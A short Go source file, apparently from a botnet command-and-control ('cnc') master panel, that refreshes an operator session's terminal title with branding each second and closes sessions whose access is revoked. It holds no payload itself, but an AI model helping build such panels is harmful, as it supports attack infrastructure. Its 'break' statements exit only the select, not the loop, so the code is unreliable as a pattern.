package views

import (
	"cnc/internal/master/sessions"
	"fmt"
	"time"
)

func titleWorker(session *sessions.Session, cancel chan struct{}) {
	for {
		select {
		case <-cancel:
			session.Close()
			return

		default:
			if err := session.Update(); err != nil {
				_ = session.Printfln("Your access has been revoked.")
				session.Close()
				break
			}

			if n, err := session.Channel.Write([]byte(
				fmt.Sprintf("\033]0;%s\007", session.ExecuteBrandingToStringNoError(nil, "title.tfx")),
			)); err != nil || n <= 0 {
				session.Close()
				break
			}

			time.Sleep(1 * time.Second)
		}
	}
}
